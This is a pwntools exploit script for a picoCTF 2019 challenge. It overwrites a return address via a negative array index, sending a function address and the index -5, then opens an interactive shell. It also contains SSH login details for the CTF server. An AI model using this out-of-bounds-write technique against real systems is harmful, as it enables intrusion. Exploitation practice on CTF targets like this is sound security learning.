import binascii
from pwn import *
import sys


BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']
context(arch="i386", os="linux")


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():
    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            'vuln', cwd='/problems/l1im1tl355_2_228ca7224f2a40c1adcfe08c18defa6a')
    else:
        sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


def main():
    sh = start()
    def send(x): return sh.sendlineafter('\n', x)

    send(str(0x080485c6))
    '''
    [return addr]
    []
    []
    []
    []
    [array addr]
    '''
    send(str(-5))


    sh.interactive()



if __name__ == '__main__':
    main()
